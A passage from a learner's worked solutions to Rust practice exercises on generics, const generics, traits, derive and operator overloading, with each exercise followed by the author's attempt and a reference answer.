= Point &#123; x: 1.0, y: 4.0 &#125;; &#125; Answer 123456789struct Point&lt;T&gt; &#123; x: T, y: T,&#125;fn main() &#123; let integer = Point &#123; x: 5, y: 10 &#125;; let float = Point &#123; x: 1.0, y: 4.0 &#125;;&#125; 🌟🌟 12345678910// 修改以下结构体让代码工作struct Point&lt;T&gt; &#123; x: T, y: T,&#125;fn main() &#123; // 不要修改这行代码！ let p = Point&#123;x: 5, y : &quot;hello&quot;.to_string()&#125;;&#125; My Answer 12345678910// 修改以下结构体让代码工作struct Point&lt;M,N&gt; &#123; x: M, y: N,&#125;fn main() &#123; // 不要修改这行代码！ let p = Point&#123;x: 5, y : &quot;hello&quot;.to_string()&#125;;&#125; Answer 12345678910// modify this struct to make the code workstruct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;fn main() &#123; // DON&#x27;T modify here let p = Point&#123;x: 5, y : &quot;hello&quot;.to_string()&#125;;&#125; 🌟🌟 123456789101112131415// 为 Val 增加泛型参数，不要修改 `main` 中的代码struct Val &#123; val: f64,&#125;impl Val &#123; fn value(&amp;self) -&gt; &amp;f64 &#123; &amp;self.val &#125;&#125;fn main() &#123; let x = Val&#123; val: 3.0 &#125;; let y = Val&#123; val: &quot;hello&quot;.to_string()&#125;; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, x.value(), y.value()); &#125; My Answer 123456789101112131415161718// 为 Val 增加泛型参数，不要修改 `main` 中的代码struct Val&lt;T&gt; &#123; val: T,&#125;impl&lt;T&gt; Val&lt;T&gt; &#123; fn value(&amp;self) -&gt; &amp;T &#123; &amp;self.val &#125;&#125;fn main() &#123; let x = Val &#123; val: 3.0 &#125;; let y = Val &#123; val: &quot;hello&quot;.to_string(), &#125;; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, x.value(), y.value());&#125; Answer 1234567891011121314struct Val&lt;T&gt; &#123; val: T,&#125;impl&lt;T&gt; Val&lt;T&gt; &#123; fn value(&amp;self) -&gt; &amp;T &#123; &amp;self.val &#125;&#125;fn main() &#123; let x = Val&#123; val: 3.0 &#125;; let y = Val&#123; val: &quot;hello&quot;.to_string()&#125;; println!(&quot;&#123;&#125;, &#123;&#125;&quot;, x.value(), y.value()); &#125; 方法 🌟🌟🌟 12345678910111213141516171819struct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;impl&lt;T, U&gt; Point&lt;T, U&gt; &#123; // 实现 mixup，不要修改其它代码！ fn mixup&#125;fn main() &#123; let p1 = Point &#123; x: 5, y: 10 &#125;; let p2 = Point &#123; x: &quot;Hello&quot;, y: &#x27;中&#x27;&#125;; let p3 = p1.mixup(p2); assert_eq!(p3.x, 5); assert_eq!(p3.y, &#x27;中&#x27;);&#125; My Answer 123456789101112131415161718192021222324252627struct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;impl&lt;T, U&gt; Point&lt;T, U&gt; &#123; // 实现 mixup，不要修改其它代码！ fn mixup&lt;V, W&gt;(self, other: Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123; Point &#123; x: self.x, y: other.y, &#125; &#125;&#125;fn main() &#123; let p1 = Point &#123; x: 5, y: 10 &#125;; let p2 = Point &#123; x: &quot;Hello&quot;, y: &#x27;中&#x27;, &#125;; let p3 = p1.mixup(p2); assert_eq!(p3.x, 5); assert_eq!(p3.y, &#x27;中&#x27;);&#125; Answer 1234567891011121314151617181920212223struct Point&lt;T, U&gt; &#123; x: T, y: U,&#125;impl&lt;T, U&gt; Point&lt;T, U&gt; &#123; fn mixup&lt;V, W&gt;(self, other: Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123; Point &#123; x: self.x, y: other.y, &#125; &#125;&#125;fn main() &#123; let p1 = Point &#123; x: 5, y: 10 &#125;; let p2 = Point &#123; x: &quot;Hello&quot;, y: &#x27;中&#x27;&#125;; let p3 = p1.mixup(p2); assert_eq!(p3.x, 5); assert_eq!(p3.y, &#x27;中&#x27;);&#125; 🌟🌟 12345678910111213141516// 修复错误，让代码工作struct Point&lt;T&gt; &#123; x: T, y: T,&#125;impl Point&lt;f32&gt; &#123; fn distance_from_origin(&amp;self) -&gt; f32 &#123; (self.x.powi(2) + self.y.powi(2)).sqrt() &#125;&#125;fn main() &#123; let p = Point&#123;x: 5, y: 10&#125;; println!(&quot;&#123;&#125;&quot;,p.distance_from_origin())&#125; My Answer 12345678910111213141516171819// 修复错误，让代码工作struct Point&lt;T&gt; &#123; x: T, y: T,&#125;impl Point&lt;f32&gt; &#123; fn distance_from_origin(&amp;self) -&gt; f32 &#123; (self.x.powi(2) + self.y.powi(2)).sqrt() &#125;&#125;fn main() &#123; let p = Point &#123; x: 5.0_f32, y: 10.0_f32, &#125;; println!(&quot;&#123;&#125;&quot;, p.distance_from_origin())&#125; Answer 123456789101112131415struct Point&lt;T&gt; &#123; x: T, y: T,&#125;impl Point&lt;f32&gt; &#123; fn distance_from_origin(&amp;self) -&gt; f32 &#123; (self.x.powi(2) + self.y.powi(2)).sqrt() &#125;&#125;fn main() &#123; let p = Point&#123;x: 5.0_f32, y: 10.0_f32&#125;; println!(&quot;&#123;&#125;&quot;,p.distance_from_origin())&#125; const泛型示例 下面的例子同时使用泛型和 const 泛型来实现一个结构体，该结构体的字段中的数组长度是可变的 12345678struct ArrayPair&lt;T, const N: usize&gt; &#123; left: [T; N], right: [T; N],&#125;impl&lt;T: Debug, const N: usize&gt; Debug for ArrayPair&lt;T, N&gt; &#123; // ...&#125; 目前，const 泛型参数只能使用以下形式的实参: 一个单独的 const 泛型参数 一个字面量 (i.e. 整数, 布尔值或字符). 一个具体的 const 表达式( 表达式中不能包含任何泛型参数) 123456789101112131415fn foo&lt;const N: usize&gt;() &#123;&#125;fn bar&lt;T, const M: usize&gt;() &#123; foo::&lt;M&gt;(); // ok: 符合第一种 foo::&lt;2021&gt;(); // ok: 符合第二种 foo::&lt;&#123;20 * 100 + 20 * 10 + 1&#125;&gt;(); // ok: 符合第三种 foo::&lt;&#123; M + 1 &#125;&gt;(); // error: 违背第三种，const 表达式中不能有泛型参数 M foo::&lt;&#123; std::mem::size_of::&lt;T&gt;() &#125;&gt;(); // error: 泛型表达式包含了泛型参数 T let _: [u8; M]; // ok: 符合第一种 let _: [u8; std::mem::size_of::&lt;T&gt;()]; // error: 泛型表达式包含了泛型参数 T&#125;fn main() &#123;&#125; const 泛型还能帮我们避免一些运行时检查，提升性能 1234567891011121314151617181920pub struct MinSlice&lt;T, const N: usize&gt; &#123; pub head: [T; N], pub tail: [T],&#125;fn main() &#123; let slice: &amp;[u8] = b&quot;Hello, world&quot;; let reference: Option&lt;&amp;u8&gt; = slice.get(6); // 我们知道 `.get` 返回的是 `Some(b&#x27; &#x27;)` // 但编译器不知道 assert!(reference.is_some()); let slice: &amp;[u8] = b&quot;Hello, world&quot;; // 当编译构建 MinSlice 时会进行长度检查，也就是在编译期我们就知道它的长度是 12 // 在运行期，一旦 `unwrap` 成功，在 `MinSlice` 的作用域内，就再无需任何检查 let minslice = MinSlice::&lt;u8, 12&gt;::from_slice(slice).unwrap(); let value: u8 = minslice.head[6]; assert_eq!(value, b&#x27; &#x27;)&#125; 练习 🌟🌟 &lt;T, const N: usize&gt; 是结构体类型的一部分，和数组类型一样，这意味着长度不同会导致类型不同： Array&lt;i32, 3&gt; 和 Array&lt;i32, 4&gt; 是不同的类型 123456789101112131415161718// 修复错误struct Array&lt;T, const N: usize&gt; &#123; data : [T; N]&#125;fn main() &#123; let arrays = [ Array&#123; data: [1, 2, 3], &#125;, Array &#123; data: [1.0, 2.0, 3.0], &#125;, Array &#123; data: [1, 2] &#125; ];&#125; My Answer 123456789101112131415161718// 修复错误struct Array&lt;T, const N: usize&gt; &#123; data : [T; N]&#125;fn main() &#123; let arrays = [ Array&#123; data: [1, 2, 3], &#125;, Array &#123; data: [1, 2, 3], &#125;, Array &#123; data: [1, 2, 3] &#125; ];&#125; Answer 1234567891011121314151617struct Array&lt;T, const N: usize&gt; &#123; data : [T; N]&#125;fn main() &#123; let arrays = [ Array&#123; data: [1, 2, 3], &#125;, Array &#123; data: [1, 2, 3], &#125;, Array &#123; data: [1, 2, 4] &#125; ];&#125; 🌟🌟 1234567891011// 填空fn print_array&lt;__&gt;(__) &#123; println!(&quot;&#123;:?&#125;&quot;, arr);&#125;fn main() &#123; let arr = [1, 2, 3]; print_array(arr); let arr = [&quot;hello&quot;, &quot;world&quot;]; print_array(arr);&#125; My Answer 1234567891011// 填空fn print_array&lt;T: std::fmt::Debug&gt;(arr: &amp;[T]) &#123; println!(&quot;&#123;:?&#125;&quot;, arr);&#125;fn main() &#123; let arr = [1, 2, 3]; print_array(&amp;arr); let arr = [&quot;hello&quot;, &quot;world&quot;]; print_array(&amp;arr);&#125; Answer 12345678910fn print_array&lt;T: std::fmt::Debug, const N: usize&gt;(arr: [T; N]) &#123; println!(&quot;&#123;:?&#125;&quot;, arr);&#125;fn main() &#123; let arr = [1, 2, 3]; print_array(arr); let arr = [&quot;hello&quot;, &quot;world&quot;]; print_array(arr);&#125; 🌟🌟🌟 有时我们希望能限制一个变量占用内存的大小，例如在嵌入式环境中，此时 const 泛型参数的第三种形式 const 表达式 就非常适合. 1234567891011121314151617181920212223 #![allow(incomplete_features)] #![feature(generic_const_exprs)] fn check_size&lt;T&gt;(val: T) where Assert&lt;&#123; core::mem::size_of::&lt;T&gt;() &lt; 768 &#125;&gt;: IsTrue, &#123; //... &#125; // 修复 main 函数中的错误 fn main() &#123; check_size([0u8; 767]); check_size([0i32; 191]); check_size([&quot;hello你好&quot;; __]); // size of &amp;str ? check_size([(); __].map(|_| &quot;hello你好&quot;.to_string())); // size of String? check_size([&#x27;中&#x27;; __]); // size of char ? &#125;pub enum Assert&lt;const CHECK: bool&gt; &#123;&#125;pub trait IsTrue &#123;&#125;impl IsTrue for Assert&lt;true&gt; &#123;&#125; My Answer 1234567891011121314151617181920212223#![allow(incomplete_features)] #![feature(generic_const_exprs)] fn check_size&lt;T&gt;(val: T) where Assert&lt;&#123; core::mem::size_of::&lt;T&gt;() &lt; 768 &#125;&gt;: IsTrue, &#123; //... &#125; // 修复 main 函数中的错误 fn main() &#123; check_size([0u8; 767]); check_size([0i32; 191]); check_size([&quot;hello你好&quot;; 1]); // size of &amp;str ? check_size([(); 1].map(|_| &quot;hello你好&quot;.to_string())); // size of String? check_size([&#x27;中&#x27;; 1]); // size of char ? &#125;pub enum Assert&lt;const CHECK: bool&gt; &#123;&#125;pub trait IsTrue &#123;&#125;impl IsTrue for Assert&lt;true&gt; &#123;&#125; Answer 1234567891011121314151617181920212223#![allow(incomplete_features)] #![feature(generic_const_exprs)] fn check_size&lt;T&gt;(val: T) where Assert&lt;&#123; core::mem::size_of::&lt;T&gt;() &lt; 768 &#125;&gt;: IsTrue, &#123; //... &#125; // fix the errors in main fn main() &#123; check_size([0u8; 767]); check_size([0i32; 191]); check_size([&quot;hello你好&quot;; 47]); // &amp;str is a string reference, containing a pointer and string length in it, so it takes two word long, in x86-64, 1 word = 8 bytes check_size([(); 31].map(|_| &quot;hello你好&quot;.to_string())); // String is a smart pointer struct, it has three fields: pointer, length and capacity, each takes 8 bytes check_size([&#x27;中&#x27;; 191]); // A char takes 4 bytes in Rust &#125; pub enum Assert&lt;const CHECK: bool&gt; &#123;&#125; pub trait IsTrue &#123;&#125; impl IsTrue for Assert&lt;true&gt; &#123;&#125; 特征示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667struct Sheep &#123; naked: bool, name: String &#125;impl Sheep &#123; fn is_naked(&amp;self) -&gt; bool &#123; self.naked &#125; fn shear(&amp;mut self) &#123; if self.is_naked() &#123; // `Sheep` 结构体上定义的方法可以调用 `Sheep` 所实现的特征的方法 println!(&quot;&#123;&#125; is already naked...&quot;, self.name()); &#125; else &#123; println!(&quot;&#123;&#125; gets a haircut!&quot;, self.name); self.naked = true; &#125; &#125;&#125;trait Animal &#123; // 关联函数签名；`Self` 指代实现者的类型 // 例如我们在为 Pig 类型实现特征时，那 `new` 函数就会返回一个 `Pig` 类型的实例，这里的 `Self` 指代的就是 `Pig` 类型 fn new(name: String) -&gt; Self; // 方法签名 fn name(&amp;self) -&gt; String; fn noise(&amp;self) -&gt; String; // 方法还能提供默认的定义实现 fn talk(&amp;self) &#123; println!(&quot;&#123;&#125; says &#123;&#125;&quot;, self.name(), self.noise()); &#125;&#125;impl Animal for Sheep &#123; // `Self` 被替换成具体的实现者类型： `Sheep` fn new(name: String) -&gt; Sheep &#123; Sheep &#123; name: name, naked: false &#125; &#125; fn name(&amp;self) -&gt; String &#123; self.name.clone() &#125; fn noise(&amp;self) -&gt; String &#123; if self.is_naked() &#123; &quot;baaaaah?&quot;.to_string() &#125; else &#123; &quot;baaaaah!&quot;.to_string() &#125; &#125; // 默认的特征方法可以被重写 fn talk(&amp;self) &#123; println!(&quot;&#123;&#125; pauses briefly... &#123;&#125;&quot;, self.name, self.noise()); &#125;&#125;fn main() &#123; // 这里的类型注释时必须的 let mut dolly: Sheep = Animal::new(&quot;Dolly&quot;.to_string()); // TODO ^ 尝试去除类型注释，看看会发生什么 dolly.talk(); dolly.shear(); dolly.talk();&#125; 练习 🌟🌟 12345678910111213141516171819202122232425262728// 完成两个 `impl` 语句块// 不要修改 `main` 中的代码trait Hello &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;hi&quot;) &#125; fn say_something(&amp;self) -&gt; String;&#125;struct Student &#123;&#125;impl Hello for Student &#123;&#125;struct Teacher &#123;&#125;impl Hello for Teacher &#123;&#125;fn main() &#123; let s = Student &#123;&#125;; assert_eq!(s.say_hi(), &quot;hi&quot;); assert_eq!(s.say_something(), &quot;I&#x27;m a good student&quot;); let t = Teacher &#123;&#125;; assert_eq!(t.say_hi(), &quot;Hi, I&#x27;m your new teacher&quot;); assert_eq!(t.say_something(), &quot;I&#x27;m not a bad teacher&quot;); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021222324252627282930313233343536373839404142// 完成两个 `impl` 语句块// 不要修改 `main` 中的代码trait Hello &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;hi&quot;) &#125; fn say_something(&amp;self) -&gt; String;&#125;struct Student &#123;&#125;impl Hello for Student &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;hi&quot;) &#125; fn say_something(&amp;self) -&gt; String &#123; String::from(&quot;I&#x27;m a good student&quot;) &#125;&#125;struct Teacher &#123;&#125;impl Hello for Teacher &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;Hi, I&#x27;m your new teacher&quot;) &#125; fn say_something(&amp;self) -&gt; String &#123; String::from(&quot;I&#x27;m not a bad teacher&quot;) &#125;&#125;fn main() &#123; let s = Student &#123;&#125;; assert_eq!(s.say_hi(), &quot;hi&quot;); assert_eq!(s.say_something(), &quot;I&#x27;m a good student&quot;); let t = Teacher &#123;&#125;; assert_eq!(t.say_hi(), &quot;Hi, I&#x27;m your new teacher&quot;); assert_eq!(t.say_something(), &quot;I&#x27;m not a bad teacher&quot;); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819202122232425262728293031323334trait Hello &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;hi&quot;) &#125; fn say_something(&amp;self) -&gt; String;&#125;struct Student &#123;&#125;impl Hello for Student &#123; fn say_something(&amp;self) -&gt; String &#123; String::from(&quot;I&#x27;m a good student&quot;) &#125;&#125;struct Teacher &#123;&#125;impl Hello for Teacher &#123; fn say_hi(&amp;self) -&gt; String &#123; String::from(&quot;Hi, I&#x27;m your new teacher&quot;) &#125; fn say_something(&amp;self) -&gt; String &#123; String::from(&quot;I&#x27;m not a bad teacher&quot;) &#125;&#125;fn main() &#123; let s = Student &#123;&#125;; assert_eq!(s.say_hi(), &quot;hi&quot;); assert_eq!(s.say_something(), &quot;I&#x27;m a good student&quot;); let t = Teacher &#123;&#125;; assert_eq!(t.say_hi(), &quot;Hi, I&#x27;m your new teacher&quot;); assert_eq!(t.say_something(), &quot;I&#x27;m not a bad teacher&quot;);&#125; Derive派生我们可以使用 #[derive] 属性来派生一些特征，对于这些特征编译器会自动进行默认实现，对于日常代码开发而言，这是非常方便的，例如大家经常用到的 Debug 特征，就是直接通过派生来获取默认实现，而无需我们手动去完成这个工作。 想要查看更多信息，可以访问这里。 🌟🌟 123456789101112131415161718192021222324252627282930313233343536373839404142// `Centimeters`, 一个元组结构体，可以被比较大小#[derive(PartialEq, PartialOrd)]struct Centimeters(f64);// `Inches`, 一个元组结构体可以被打印#[derive(Debug)]struct Inches(i32);impl Inches &#123; fn to_centimeters(&amp;self) -&gt; Centimeters &#123; let &amp;Inches(inches) = self; Centimeters(inches as f64 * 2.54) &#125;&#125;// 添加一些属性让代码工作// 不要修改其它代码！struct Seconds(i32);fn main() &#123; let _one_second = Seconds(1); println!(&quot;One second looks like: &#123;:?&#125;&quot;, _one_second); let _this_is_true = _one_second == _one_second; let _this_is_true = _one_second &gt; _one_second; let foot = Inches(12); println!(&quot;One foot equals &#123;:?&#125;&quot;, foot); let meter = Centimeters(100.0); let cmp = if foot.to_centimeters() &lt; meter &#123; &quot;smaller&quot; &#125; else &#123; &quot;bigger&quot; &#125;; println!(&quot;One foot is &#123;&#125; than one meter.&quot;, cmp);&#125; My Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344// `Centimeters`, 一个元组结构体，可以被比较大小#[derive(PartialEq, PartialOrd)]struct Centimeters(f64);// `Inches`, 一个元组结构体可以被打印#[derive(Debug)]struct Inches(i32);impl Inches &#123; fn to_centimeters(&amp;self) -&gt; Centimeters &#123; let &amp;Inches(inches) = self; Centimeters(inches as f64 * 2.54) &#125;&#125;// 添加一些属性让代码工作// 不要修改其它代码！#[derive(Debug)]#[derive(PartialEq, PartialOrd)]struct Seconds(i32);fn main() &#123; let _one_second = Seconds(1); println!(&quot;One second looks like: &#123;:?&#125;&quot;, _one_second); let _this_is_true = _one_second == _one_second; let _this_is_true = _one_second &gt; _one_second; let foot = Inches(12); println!(&quot;One foot equals &#123;:?&#125;&quot;, foot); let meter = Centimeters(100.0); let cmp = if foot.to_centimeters() &lt; meter &#123; &quot;smaller&quot; &#125; else &#123; &quot;bigger&quot; &#125;; println!(&quot;One foot is &#123;&#125; than one meter.&quot;, cmp);&#125; Answer 12345678910111213141516171819202122232425262728293031323334353637383940414243// `Centimeters`, a tuple struct that can be compared#[derive(PartialEq, PartialOrd)]struct Centimeters(f64);// `Inches`, a tuple struct that can be printed#[derive(Debug)]struct Inches(i32);impl Inches &#123; fn to_centimeters(&amp;self) -&gt; Centimeters &#123; let &amp;Inches(inches) = self; Centimeters(inches as f64 * 2.54) &#125;&#125;// Add some attributes to make the code work// DON&#x27;T modify other codes#[derive(Debug,PartialEq,PartialOrd)]struct Seconds(i32);fn main() &#123; let _one_second = Seconds(1); println!(&quot;One second looks like: &#123;:?&#125;&quot;, _one_second); let _this_is_true = (_one_second == _one_second); let _this_is_false = (_one_second &gt; _one_second); let foot = Inches(12); println!(&quot;One foot equals &#123;:?&#125;&quot;, foot); let meter = Centimeters(100.0); let cmp = if foot.to_centimeters() &lt; meter &#123; &quot;smaller&quot; &#125; else &#123; &quot;bigger&quot; &#125;; println!(&quot;One foot is &#123;&#125; than one meter.&quot;, cmp);&#125; 运算符在 Rust 中，许多运算符都可以被重载，事实上，运算符仅仅是特征方法调用的语法糖。例如 a + b 中的 + 是 std::ops::Add 特征的 add 方法调用，因此我们可以为自定义类型实现该特征来支持该类型的加法运算。 🌟🌟 12345678910111213use std::ops;// 实现 fn multiply 方法// 如上所述，`+` 需要 `T` 类型实现 `std::ops::Add` 特征// 那么, `*` 运算符需要实现什么特征呢? 你可以在这里找到答案: https://doc.rust-lang.org/core/ops/fn multiplyfn main() &#123; assert_eq!(6, multiply(2u8, 3u8)); assert_eq!(5.0, multiply(1.0, 5.0)); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415use std::ops;// 实现 fn multiply 方法// 如上所述，`+` 需要 `T` 类型实现 `std::ops::Add` 特征// 那么, `*` 运算符需要实现什么特征呢? 你可以在这里找到答案: https://doc.rust-lang.org/core/ops/fn multiply&lt;T: ops::Mul&lt;Output = T&gt;&gt;(a:T,b:T) -&gt;T&#123; a*b&#125;fn main() &#123; assert_eq!(6, multiply(2u8, 3u8)); assert_eq!(5.0, multiply(1.0, 5.0)); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213use std::ops;// implement fn multiply to make the code work// As mentioned above, `+` needs `T` to implement `std::ops::Add` Trait// so, what about `*` ? You can find the answer here: https://doc.rust-lang.org/core/ops/fn multiply&lt;T: ops::Mul&lt;Output = T&gt;&gt;(x: T, y: T) -&gt; T &#123; x * y&#125;fn main() &#123; assert_eq!(6, multiply(2u8, 3u8)); assert_eq!(5.0, multiply(1.0, 5.0));&#125; 🌟🌟🌟 1234567891011121314151617181920212223242526272829303132333435// 修复错误，不要修改 `main` 中的代码!use std::ops;struct Foo;struct Bar;struct FooBar;struct BarFoo;// 下面的代码实现了自定义类型的相加： Foo + Bar = FooBarimpl ops::Add&lt;Bar&gt; for Foo &#123; type Output = FooBar; fn add(self, _rhs: Bar) -&gt; FooBar &#123; FooBar &#125;&#125;impl ops::Sub&lt;Foo&gt; for Bar &#123; type Output = BarFoo; fn sub(self, _rhs: Foo) -&gt; BarFoo &#123; BarFoo &#125;&#125;fn main() &#123; // 不要修改下面代码 // 你需要为 FooBar 派生一些特征来让代码工作 assert_eq!(Foo + Bar, FooBar); assert_eq!(Foo - Bar, BarFoo); println!(&quot;Success!&quot;)&#125; My Answer 1234567891011121314151617181920212223242526272829303132333435363738// 修复错误，不要修改 `main` 中的代码!use std::ops;struct Foo;struct Bar;#[derive(Debug,PartialEq)]struct FooBar;#[derive(Debug,PartialEq)]struct BarFoo;// 下面的代码实现了自定义类型的相加： Foo + Bar = FooBarimpl ops::Add&lt;Bar&gt; for Foo &#123;type Output = FooBar;fn add(self, _rhs: Bar) -&gt; FooBar &#123; FooBar&#125;&#125;impl ops::Sub&lt;Bar&gt; for Foo &#123;type Output = BarFoo;fn sub(self, _rhs: Bar) -&gt; BarFoo &#123; BarFoo&#125;fn main() &#123;// 不要修改下面代码// 你需要为 FooBar 派生一些特征来让代码工作assert_eq!(Foo + Bar, FooBar);assert_eq!(Foo - Bar, BarFoo);println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415161718192021222324252627282930313233343536use std::ops;struct Foo;struct Bar;#[derive(PartialEq, Debug)]struct FooBar;#[derive(PartialEq, Debug)]struct BarFoo;// The `std::ops::Add` trait is used to specify the functionality of `+`.// Here, we make `Add&lt;Bar&gt;` - the trait for addition with a RHS of type `Bar`.// The following block implements the operation: Foo + Bar = FooBarimpl ops::Add&lt;Bar&gt; for Foo &#123; type Output = FooBar; fn add(self, _rhs: Bar) -&gt; FooBar &#123; FooBar &#125;&#125;impl ops::Sub&lt;Bar&gt; for Foo &#123; type Output = BarFoo; fn sub(self, _rhs: Bar) -&gt; BarFoo &#123; BarFoo &#125;&#125;fn main() &#123; // DON&#x27;T modify the below code // you need to derive some trait for FooBar to make it comparable assert_eq!(Foo + Bar, FooBar); assert_eq!(Foo - Bar, BarFoo);&#125; 使用特征作为函数参数除了使用具体类型来作为函数参数，我们还能通过 impl Trait 的方式来指定实现了该特征的参数：该参数能接受的类型必须要实现指定的特征。 🌟🌟🌟 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 实现 `fn summary` // 修复错误且不要移除任何代码行trait Summary &#123; fn summarize(&amp;self) -&gt; String;&#125;#[derive(Debug)]struct Post &#123; title: String, author: String, content: String,&#125;impl Summary for Post &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;The author of post &#123;&#125; is &#123;&#125;&quot;, self.title, self.author) &#125;&#125;#[derive(Debug)]struct Weibo &#123; username: String, content: String,&#125;impl Summary for Weibo &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;&#123;&#125; published a weibo &#123;&#125;&quot;, self.username, self.content) &#125;&#125;fn main() &#123; let post = Post &#123; title: &quot;Popular Rust&quot;.to_string(), author: &quot;Sunface&quot;.to_string(), content: &quot;Rust is awesome!&quot;.to_string(), &#125;; let weibo = Weibo &#123; username: &quot;sunface&quot;.to_string(), content: &quot;Weibo seems to be worse than Tweet&quot;.to_string(), &#125;; summary(post); summary(weibo); println!(&quot;&#123;:?&#125;&quot;, post); println!(&quot;&#123;:?&#125;&quot;, weibo);&#125;// 在下面实现 `fn summary` 函数 My Answer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 实现 `fn summary` // 修复错误且不要移除任何代码行 trait Summary &#123; fn summarize(&amp;self) -&gt; String; &#125; #[derive(Debug)] struct Post &#123; title: String, author: String, content: String, &#125; impl Summary for Post &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;The author of post &#123;&#125; is &#123;&#125;&quot;, self.title, self.author) &#125; &#125; #[derive(Debug)] struct Weibo &#123; username: String, content: String, &#125; impl Summary for Weibo &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;&#123;&#125; published a weibo &#123;&#125;&quot;, self.username, self.content) &#125; &#125; fn main() &#123; let post = Post &#123; title: &quot;Popular Rust&quot;.to_string(), author: &quot;Sunface&quot;.to_string(), content: &quot;Rust is awesome!&quot;.to_string(), &#125;; let weibo = Weibo &#123; username: &quot;sunface&quot;.to_string(), content: &quot;Weibo seems to be worse than Tweet&quot;.to_string(), &#125;; summary(&amp;post); summary(&amp;weibo); println!(&quot;&#123;:?&#125;&quot;, post); println!(&quot;&#123;:?&#125;&quot;, weibo); &#125; // 在下面实现 `fn summary` 函数 fn summary&lt;T: Summary&gt;(item: &amp;T) &#123; item.summarize(); &#125; Answer 1234567891011121314151617181920212223242526272829303132333435363738394041424344// implement `fn summary` to make the code work // fix the errors without removing any code line trait Summary &#123; fn summarize(&amp;self) -&gt; String; &#125; #[derive(Debug)] struct Post &#123; title: String, author: String, content: String, &#125; impl Summary for Post &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;The author of post &#123;&#125; is &#123;&#125;&quot;, self.title, self.author) &#125; &#125; #[derive(Debug)] struct Weibo &#123; username: String, content: String, &#125; impl Summary for Weibo &#123; fn summarize(&amp;self) -&gt; String &#123; format!(&quot;&#123;&#125; published a weibo &#123;&#125;&quot;, self.username, self.content) &#125; &#125; fn main() &#123; let post = Post &#123; title: &quot;Popular Rust&quot;.to_string(), author: &quot;Sunface&quot;.to_string(), content: &quot;Rust is awesome!&quot;.to_string(), &#125;; let weibo = Weibo &#123; username: &quot;sunface&quot;.to_string(), content: &quot;Weibo seems to be worse than Tweet&quot;.to_string(), &#125;; summary(&amp;post); summary(&amp;weibo); println!(&quot;&#123;:?&#125;&quot;, post); println!(&quot;&#123;:?&#125;&quot;, weibo); &#125; fn summary(t: &amp;impl Summary) &#123; let _ = t.summarize(); &#125; 使用特征作为函数返回值我们还可以在函数的返回值中使用 impl Trait 语法。然后只有在返回值是同一个类型时，才能这么使用，如果返回值是不同的类型，你可能更需要特征对象。 🌟🌟 1234567891011121314151617181920212223242526272829struct Sheep &#123;&#125;struct Cow &#123;&#125; trait Animal &#123; fn noise(&amp;self) -&gt; String;&#125; impl Animal for Sheep &#123; fn noise(&amp;self) -&gt; String &#123; &quot;baaaaah!&quot;.to_string() &#125;&#125; impl Animal for Cow &#123; fn noise(&amp;self) -&gt; String &#123; &quot;moooooo!&quot;.to_string() &#125;&#125; // 返回一个类型，该类型实现了 Animal 特征，但是我们并不能在编译期获知具体返回了哪个类型// 修复这里的错误，你可以使用虚假的随机，也可以使用特征对象fn random_animal(random_number: f64) -&gt; impl Animal &#123; if random_number &lt; 0.5 &#123; Sheep &#123;&#125; &#125; else &#123; Cow &#123;&#125; &#125;&#125; fn main() &#123; let random_number = 0.234; let animal = random_animal(random_number); println!(&quot;You&#x27;ve randomly chosen an animal, and it says &#123;&#125;&quot;, animal.noise());&#125; My Answer 12345678910111213141516171819202122232425262728293031323334struct Sheep &#123;&#125;struct Cow &#123;&#125;trait Animal &#123; fn noise(&amp;self) -&gt; String;&#125;impl Animal for Sheep &#123; fn noise(&amp;self) -&gt; String &#123; &quot;baaaaah!&quot;.to_string() &#125;&#125;impl Animal for Cow &#123; fn noise(&amp;self) -&gt; String &#123; &quot;moooooo!&quot;.to_string() &#125;&#125;// 返回一个类型，该类型实现了 Animal 特征，但是我们并不能在编译期获知具体返回了哪个类型// 修复这里的错误，你可以使用虚假的随机，也可以使用特征对象fn random_animal(random_number: f64) -&gt; impl Animal &#123; if random_number &lt; 0.5 &#123; Sheep &#123;&#125; &#125; else &#123; Sheep&#123;&#125; &#125;&#125;fn main() &#123; let random_number = 0.234; let animal = random_animal(random_number); println!(&quot;You&#x27;ve randomly chosen an animal, and it says &#123;&#125;&quot;, animal.noise());&#125; Answer 12345678910111213141516171819202122232425262728293031323334struct Sheep &#123;&#125;struct Cow &#123;&#125;trait Animal &#123; fn noise(&amp;self) -&gt; String;&#125;impl Animal for Sheep &#123; fn noise(&amp;self) -&gt; String &#123; &quot;baaaaah!&quot;.to_string() &#125;&#125;impl Animal for Cow &#123; fn noise(&amp;self) -&gt; String &#123; &quot;moooooo!&quot;.to_string() &#125;&#125;// Returns some struct that implements Animal, but we don&#x27;t know which one at compile time.// FIX the erros here, you can make a fake random, or you can use trait objectfn random_animal(random_number: f64) -&gt; Box&lt;dyn Animal&gt; &#123; if random_number &lt; 0.5 &#123; Box::new(Sheep &#123;&#125;) &#125; else &#123; Box::new(Cow&#123;&#125;) &#125;&#125;fn main() &#123; let random_number = 0.234; let animal = random_animal(random_number); println!(&quot;You&#x27;ve randomly chosen an animal, and it says 